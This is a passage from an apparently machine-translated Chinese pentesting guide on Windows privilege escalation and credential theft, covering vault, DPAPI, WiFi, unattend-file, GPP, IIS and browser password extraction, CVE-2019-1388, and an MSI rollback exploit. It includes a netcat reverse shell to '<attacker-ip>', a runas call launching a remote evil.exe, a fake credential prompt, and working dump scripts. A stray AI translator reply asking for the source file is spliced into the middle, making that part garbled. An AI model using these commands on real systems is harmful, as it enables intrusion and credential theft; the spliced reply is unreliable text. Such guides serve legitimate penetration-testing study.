Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查**受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(list rules, create rules, turn off, turn off...)**

More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### 适用于 Linux 的 Windows 子系统 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到

如果获得 root 用户权限，你可以监听任意端口（首次使用 `nc.exe` 在端口上监听时，会通过 GUI 提示是否允许 `nc` 被防火墙放行）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中探索 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用户针对服务器、网站和其他程序的凭据，使得 **Windows** 能够 **自动登录用户**。乍看之下，似乎用户可以将 Facebook、Twitter、Gmail 等的凭据存入，从而通过浏览器自动登录。但事实并非如此。

Windows Vault 存储的是 Windows 可以用来自动登录用户的凭据，这意味着任何 **需要凭据来访问资源的 Windows 应用程序**（服务器或网站）**都可以使用这个 Credential Manager** & Windows Vault，并使用存储的凭据来替代用户每次输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们无法使用针对特定资源的凭据。因此，如果你的应用想使用 vault，应该以某种方式与 Credential Manager 通信，并从默认存储 vault 请求该资源的凭据。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 和 `/savecred` 选项来使用已保存的凭据。下面的示例通过 SMB 共享调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 配合提供的一组凭证。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意，mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

数据保护 API (DPAPI) 提供了一种对称加密数据的方法，主要在 Windows 操作系统中用于对非对称私钥的对称加密。该加密利用用户或系统的秘密作为显著的熵来源。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。在涉及系统加密的场景中，它利用系统的域认证秘密。

使用 DPAPI 加密的用户 RSA 密钥存储在 %APPDATA%\Microsoft\Protect\{SID} 目录下，其中 {SID} 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**，通常由 64 字节的随机数据组成。（注意该目录的访问受到限制，无法通过 CMD 中的 `dir` 列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并使用适当的参数（`/pvk` 或 `/rpc`）来解密它。

**credentials files protected by the master password** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred` 并提供相应的 `/masterkey` 来解密。\
你可以使用 `sekurlsa::dpapi` 模块从 **内存** 中提取许多 **DPAPI 主密钥**（如果你是 root）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 凭据

**PowerShell 凭据** 经常用于 **scripting** 和自动化任务，作为一种方便地存储加密凭据的方式。 这些凭据使用 **DPAPI** 保护，通常意味着它们只能由在创建它们的同一台计算机上的相同用户解密。

要从包含凭据的文件中对 PS credentials 进行 **解密**，你可以这样做：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
使用 **Mimikatz** `dpapi::rdg` 模块并配合合适的 `/masterkey` 来 **解密任何 .rdg 文件**\
你可以使用 **Mimikatz** 的 `sekurlsa::dpapi` 模块从内存中 **提取多个 DPAPI 主密钥**

### Sticky Notes

人们经常在 Windows 工作站上使用 StickyNotes 应用来 **保存密码** 和其他信息，而没有意识到它实际上是一个数据库文件。该文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，值得搜索并检查。

### AppCmd.exe

**注意：要从 AppCmd.exe 恢复密码，你需要具有管理员权限并在高完整性级别下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录下。\
如果此文件存在，则可能已配置了一些 **credentials** 并可以被 **recovered**。

这段代码摘自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查是否存在 `C:\Windows\CCM\SCClient.exe` .\
安装程序以 **SYSTEM 权限运行**，许多容易受到 **DLL Sideloading (信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭据）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 密钥

SSH 私钥可能会存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果在该路径中发现任何条目，它很可能是一个已保存的 SSH key。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\
关于该技术的更多信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行，并且您希望它在开机时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个技术不再有效。我尝试创建了一些 ssh 密钥，用 `ssh-add` 添加它们并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在非对称密钥认证过程中未识别到使用 `dpapi.dll`。

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit**: _post/windows/gather/enum_unattend_

示例内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的 GPP 密码

以前有一项功能允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义的本地管理员账户。然而，这种方法存在严重的安全缺陷。首先，作为 XML 文件存储在 SYSVOL 中的 Group Policy Objects (GPOs) 可以被任何域用户访问。其次，这些 GPP 中的密码使用公开文档化的默认密钥以 AES256 加密，任何经过认证的用户都能够将其解密。这构成严重风险，因为可能让用户获得提升的权限。

为减轻此风险，开发了一个函数用于扫描本地缓存的 GPP 文件，查找包含非空 "cpassword" 字段的文件。发现此类文件后，该函数解密密码并返回一个自定义的 PowerShell 对象。该对象包含有关 GPP 以及文件位置的详细信息，帮助识别并修复该安全漏洞。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista 之前)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
包含 credentials 的 web.config 示例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

你可以随时 **要求用户输入他的 credentials，甚至不同用户的 credentials** 如果你认为他可能知道这些信息(注意，**直接向客户端索要** **credentials** 是非常 **危险**)：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知有些文件曾包含 **passwords**，以 **clear-text** 或 **Base64** 形式存储。
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我需要你提供要搜索/翻译的文件内容或明确说明“proposed files”指哪些文件（或把这些文件路径列出来）。请把 src/windows-hardening/windows-local-privilege-escalation/README.md 的内容粘贴过来，或授权我访问这些文件，然后我会按要求将其中的英文翻译成中文并保留原有的 Markdown/HTML 语法与链接。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭证

你也应该检查回收站以查找其中的凭证

要**恢复由多个程序保存的密码**，你可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表中

**其他可能包含凭证的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

你应该检查保存 **Chrome or Firefox** 密码的 dbs。\
还要检查浏览器的历史、书签和收藏夹，因为有些 **密码** 可能存储在那里。

提取浏览器密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) 是 Windows 操作系统内置的一种技术，允许不同语言的软件组件之间进行互通。每个 COM 组件通过 class ID (CLSID) 进行标识，每个组件通过一个或多个接口（由 interface IDs (IIDs) 标识）暴露其功能。

COM classes 和 interfaces 在注册表的 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface** 下定义。该注册表由 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 合并而成，等于 **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本上，如果你能够覆盖将要被执行的任意 **DLLs**，且该 DLL 将由不同用户执行，那么你可以 escalate privileges。

要了解攻击者如何将 COM Hijacking 用作持久化机制，请查看：


{{#ref}}
com-hijacking.md
{{#endref}}

### **文件与注册表中的通用密码搜索**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** 插件。我创建了这个插件以 **自动执行每个搜索 credentials 的 metasploit POST module**，在 victim 内运行。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个很棒的工具，用于从系统中提取 password。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索多个将这些数据以明文保存的工具中的 **sessions**、**usernames** 和 **passwords** (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[阅读此示例以获取有关 **如何检测并利用此漏洞** 的更多信息。](leaked-handle-exploitation.md)\
[阅读这篇**其他文章以获得更完整的说明，讲解如何测试并滥用更多以不同权限级别（不仅仅是 full access）继承的进程和线程打开句柄**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

共享内存段，称为 **pipes**，用于进程间通信和数据传输。

Windows 提供了一个名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨网络。它类似于客户端/服务器架构，角色定义为 **named pipe server** 和 **named pipe client**。

当 **client** 通过 pipe 发送数据时，设置该 pipe 的 **server** 可以在拥有必要的 **SeImpersonate** 权限的情况下**采用 client 的身份**。识别出通过你能模拟的 pipe 与之通信的**privileged process**，在该进程与您建立的 pipe 交互时模拟其身份，就有机会**获得更高的权限**。有关执行此类攻击的说明，请参见[**这里**](named-pipe-client-impersonation.md)和[**这里**](#from-high-integrity-to-system)。

此外，下面的工具允许像 burp 这样的工具**拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **，而此工具允许列出并查看所有 pipes 以查找 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

查看页面 [https://filesec.io/](https://filesec.io/)

### **监控命令行中的密码**

当以用户身份获取 shell 时，可能存在计划任务或其他正在执行的进程会**在命令行上传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与上一次状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程窃取密码

## 从低权限用户提升到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC 绕过

如果你可以访问图形界面（通过 console 或 RDP）并且 UAC 已启用，在某些 Microsoft Windows 版本中，非特权用户可以以 "NT\AUTHORITY SYSTEM" 运行终端或其他任何进程。

这使得可以利用同一个漏洞同时提升权限并绕过 UAC。此外，无需安装任何东西，过程使用的二进制文件已由 Microsoft 签名并发布。

受影响的一些系统如下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

阅读此内容以 **了解 Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后 **阅读此内容以了解 UAC 和 UAC bypasses：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

该技术在 [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 中描述，exploit 代码 [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

该攻击本质上是滥用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个 **malicious MSI installer**，用于劫持 `C:\Config.Msi` 文件夹，Windows Installer 在卸载其他 MSI 包时会将 rollback 文件存放到该文件夹，而这些 rollback 文件会被修改为包含恶意载荷。

该技术摘要如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 创建一个 `.msi`，在可写文件夹（`TARGETDIR`）中安装一个无害文件（例如 `dummy.txt`）。
- 将安装程序标记为 **"UAC Compliant"**，以便 **non-admin user** 可以运行它。
- 在安装后保持对该文件的 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载相同的 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi` 并将其重命名为 `.rbf` 文件（rollback 备份）。
- 使用 `GetFinalPathNameByHandle` 轮询打开的文件句柄，以检测该文件何时变为 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- 该 `.msi` 包含一个 **custom uninstall action (`SyncOnRbfWritten`)**，它会：
- 在 `.rbf` 写入时发出信号。
- 然后在继续卸载之前 **等待** 另一个事件。

- Step 4: Block Deletion of `.rbf`
- 在收到信号后，**以不包含 `FILE_SHARE_DELETE` 的方式打开 `.rbf` 文件**——这会 **阻止其被删除**。
- 然后 **回信号**，以便卸载程序可以完成。
- Windows Installer 无法删除该 `.rbf`，因为它无法删除所有内容，**`C:\Config.Msi` 不会被移除**。

